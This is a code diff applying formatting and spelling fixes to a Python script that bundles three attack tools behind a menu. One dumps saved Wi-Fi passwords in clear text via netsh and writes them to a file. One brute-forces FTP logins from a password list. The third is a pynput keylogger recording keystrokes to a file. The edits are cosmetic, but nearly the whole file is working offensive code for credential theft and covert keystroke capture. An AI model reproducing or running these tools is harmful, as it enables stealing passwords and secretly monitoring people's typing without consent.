@@ -1,25 +1,26 @@
 import subprocess
 import re
 from ftplib import FTP  # a class to implement the ftp client side
-from colorama import Fore, init  # for printing fancy colors on terminal
-from pynput.keyboard import Key, Listener
+from colorama import Fore  # for printing fancy colors on terminal
+from pynput.keyboard import Listener
 
 
 def wifi_password_stealer():
-    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
     # using regular expressions to grep the string we want from the above command output and save it into a variable
     profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
     # this will store the wifi ssids and their corresponding password(ssid: password)
     wifi_data = ""
 
-    # iterate throgh the profile names 
+    # iterate through the profile names
     for profile in profile_names:
 
         # remove trailing whitespaces and newline characters
         profile = profile.strip()
 
         # show the profile details together with the clear text password
-        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output = True).stdout.decode()
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],
+                                      capture_output=True).stdout.decode()
 
         # use regular expressions to search for the password
         profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
@@ -30,8 +31,8 @@ def wifi_password_stealer():
         else:
             wifi_data += f"{profile}: {profile_password[0].strip()}\n"
 
-    # save the wifi details in a file      
-    with open("wifis.txt", "w") as file:
+    # save the Wi-Fi details in a file
+    with open("wifi.txt", "w") as file:
         file.write(wifi_data)
 
 
@@ -51,27 +52,28 @@ def brute_forcer():
 
                 # return true if the server allows anonymous login
                 return True
-        except:
+        except Exception:
             # otherwise return false
             return False
 
     def ftp_buster(host, username, passwordlist):
-        # open the passwordlist file and read the passwords
+        # open the password-list file and read the passwords
         with open(passwordlist, "r") as passwd_file:
             # iterate over passwords one by one
             # if the password is found, break out of the loop
             for password in passwd_file.readlines():
                 password = password.strip()
-                with FTP(host=host,timeout=0.1) as ftp:
+                with FTP(host=host, timeout=0.1) as ftp:
                     try:
                         ftp.login(user=username, passwd=password)
-                        print(f"{Fore.GREEN}Password Found: {password}",Fore.RESET)
+                        print(f"{Fore.GREEN}Password Found: {password}", Fore.RESET)
                         break
                     except Exception as e:
                         print(f"Trying...:{password}")
                         continue
 
-    # check if our ftp server accepts anonymous login, if not we try to brute force the password using the ftp_buster function
+    # check if our ftp server accepts anonymous login, if not we try to brute force the password using the ftp_buster
+    # function
     if check_anon_login(host=host):
         print("logged In")
     else:
@@ -100,7 +102,7 @@ def key_logger():
             # if true/ > 0 we replace it with the required value
             # otherwise we just append it into the file as it is
             if key.find("backspace") > 0:
-                logfile.write(" backspcae ")
+                logfile.write(" backspace ")
             elif key.find("space") > 0:
                 logfile.write(" ")
             elif key.find("shift") > 0:
@@ -115,7 +117,7 @@ def key_logger():
             # duplicates appended in the file. the next time we press another key
             keys.clear()
 
-    with Listener(on_press=on_keypress) as listener :
+    with Listener(on_press=on_keypress) as listener:
         listener.join()
 
 
@@ -125,7 +127,8 @@ def run():
         wifi_password_stealer()
     elif option == 2:
         brute_forcer()
-    elif option ==3:
+    elif option == 3:
         key_logger()
+
 
 run()
